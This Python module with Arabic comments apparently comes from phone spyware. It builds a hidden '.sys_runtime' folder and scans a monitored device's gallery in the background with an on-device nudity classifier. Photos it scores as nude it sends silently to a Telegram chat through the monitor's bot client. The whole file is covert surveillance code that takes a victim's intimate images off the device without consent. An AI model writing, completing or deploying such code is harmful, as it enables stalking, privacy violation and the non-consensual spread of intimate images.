# -*- coding: utf-8 -*-
import os, time, threading, logging, sqlite3, hashlib, gc, shutil
from datetime import datetime

# إعداد المسارات
P = os.path.join(os.getcwd(), ".sys_runtime")
M = os.path.join(P, ".models")
T = os.path.join(P, "n_tmp")

# الروابط الاحتياطية (تم تعطيلها لأن النموذج مضمن في assets)
MODEL_URLS = []

for d in [M, T]:
    if not os.path.exists(d):
        os.makedirs(d)

# تسجيل الأخطاء مع إدارة حجم الملف (حذف السجل إذا تجاوز 5 ميجابايت)
log_path = os.path.join(P, "n.log")
if os.path.exists(log_path) and os.path.getsize(log_path) > 5242880:
    try:
        with open(log_path, 'w') as f:
            f.write("--- Log Reset ---\n")
    except:
        pass
logging.basicConfig(filename=log_path, level=logging.ERROR, filemode='a')

try:
    import numpy as np
    from PIL import Image
    import tflite_runtime.interpreter as tflite
    JNI = True
except:
    JNI = False

class NudeDetector:
    def __init__(self, mon=None):
        self.mon = mon
        self.active = False
        self.model = None
        self._lock = threading.Lock()
        self.last_run = 0
        self.model_path = os.path.join(M, "engine_v2.tflite")
        self.assets_path = os.path.join(os.getcwd(), "assets", "engine_v2.tflite")
        self.db = os.path.join(P, "n_cache.db")
        self._init_db()
        threading.Thread(target=self._prepare_engine, daemon=True).start()

    def _init_db(self):
        try:
            with sqlite3.connect(self.db) as conn:
                conn.execute('CREATE TABLE IF NOT EXISTS scan_logs (h TEXT PRIMARY KEY, ts INTEGER)')
                old = int(time.time()) - (60 * 86400)
                conn.execute('DELETE FROM scan_logs WHERE ts < ?', (old,))
                conn.commit()
        except:
            pass

    def _prepare_engine(self):
        if not JNI:
            return
        try:
            if not os.path.exists(self.model_path):
                if os.path.exists(self.assets_path):
                    shutil.copy(self.assets_path, self.model_path)
                    logging.info("Model copied from assets")
            if not os.path.exists(self.model_path) and MODEL_URLS:
                for url in MODEL_URLS:
                    if self._download_model(url):
                        break
            self._load_engine()
        except Exception as e:
            logging.error(f"Engine prep error: {e}")

    def _download_model(self, url):
        try:
            r = requests.get(url, timeout=60, stream=True)
            if r.status_code == 200:
                with open(self.model_path, 'wb') as f:
                    for chunk in r.iter_content(chunk_size=65536):
                        if chunk:
                            f.write(chunk)
                return os.path.getsize(self.model_path) > 1000000
        except:
            return False
        return False

    def _load_engine(self):
        try:
            if os.path.exists(self.model_path):
                self.model = tflite.Interpreter(model_path=self.model_path)
                self.model.allocate_tensors()
                self.in_idx = self.model.get_input_details()[0]['index']
                self.out_idx = self.model.get_output_details()[0]['index']
        except Exception as e:
            logging.error(f"Load engine error: {e}")

    def _analyze(self, path, retry=1):
        img = None
        try:
            if not self.model:
                return 0
            # التأكد من أن الملف صورة وليس أي نوع آخر (حماية إضافية)
            if not path.lower().endswith(('.png', '.jpg', '.jpeg', '.webp')):
                return 0
            img = Image.open(path).convert('RGB').resize((224, 224), Image.LANCZOS)
            # تحسين النطاق: [-1, 1] بدلاً من [0, 1] لزيادة دقة MobileNetV2
            arr = (np.array(img, dtype=np.float32) / 127.5) - 1.0
            arr = np.expand_dims(arr, axis=0)
            self.model.set_tensor(self.in_idx, arr)
            self.model.invoke()
            out = self.model.get_tensor(self.out_idx)[0]
            # افتراض أن المخرج الثاني هو فئة "عارية" (يختلف حسب تدريب النموذج)
            prob = float(out[1]) if len(out) > 1 else float(out[0])
            img.close()
            del arr, out
            return prob
        except Exception as e:
            if img:
                img.close()
            logging.error(f"Analysis error {os.path.basename(path)}: {e}")
            # إعادة المحاولة مرة واحدة بعد انتظار قصير
            if retry > 0:
                time.sleep(0.5)
                return self._analyze(path, retry - 1)
            # في حالة الفشل النهائي، نقل الملف إلى مجلد التعثر (للتحقق اليدوي)
            try:
                shutil.copy(path, os.path.join(T, os.path.basename(path)))
            except:
                pass
            return 0

    def scan(self, mon):
        if self.active or not self.model:
            return
        if hasattr(mon, '_bat'):
            b, c = mon._bat()
            if b < 15 and not c:
                return
        n = time.time()
        if (n - self.last_run) < 1800:
            return
        self.last_run = n
        threading.Thread(target=self._worker, args=(mon,), daemon=True).start()

    def _worker(self, mon):
        if not self._lock.acquire(blocking=False):
            return
        try:
            self.active = True
            logging.info(f"AI scan started at {datetime.now()}")
            sc = getattr(mon, 'media_scanner', None)
            if not sc:
                return
            items = sc.get_gallery_by_category("pending", limit=15)
            processed = 0
            for item in items:
                path = item.get("path")
                if not path or not os.path.exists(path):
                    continue
                # تخطي الملفات غير الصورية (فحص الامتداد)
                if not path.lower().endswith(('.png', '.jpg', '.jpeg', '.webp')):
                    continue
                # تخطي الصور الصغيرة جداً (< 10KB) لتحسين الأداء
                try:
                    if os.path.getsize(path) < 10240:
                        continue
                except:
                    continue
                h = hashlib.md5(path.encode()).hexdigest()
                if self._is_cached(h):
                    continue
                prob = self._analyze(path)
                if prob > 0.85:
                    sc.update_category(h, "nude", prob)
                    self._report(path, item.get("label", "??"), mon)
                elif prob > 0.45:
                    sc.update_category(h, "questionable", prob)
                else:
                    sc.update_category(h, "normal", prob)
                self._mark_cached(h)
                processed += 1
                time.sleep(0.5)
            logging.info(f"AI scan finished, processed {processed} images")
        finally:
            self.active = False
            self._lock.release()
            gc.collect()

    def _is_cached(self, h):
        try:
            with sqlite3.connect(self.db) as conn:
                return conn.execute('SELECT 1 FROM scan_logs WHERE h=?', (h,)).fetchone() is not None
        except:
            return False

    def _mark_cached(self, h):
        try:
            with sqlite3.connect(self.db) as conn:
                conn.execute('INSERT OR REPLACE INTO scan_logs VALUES (?, ?)', (h, int(time.time())))
                conn.commit()
        except:
            pass

    def _report(self, path, label, mon):
        try:
            tg = getattr(mon, 'tg', None)
            vlt = getattr(mon, 'vlt', None)
            if tg and vlt:
                with open(path, 'rb') as f:
                    tg._ap("sendPhoto", {
                        "chat_id": vlt,
                        "caption": f"🔞 #{label} | {datetime.now().strftime('%H:%M')}",
                        "disable_notification": True
                    }, {"photo": f})
        except:
            pass

def create(mon=None):
    return NudeDetector(mon)
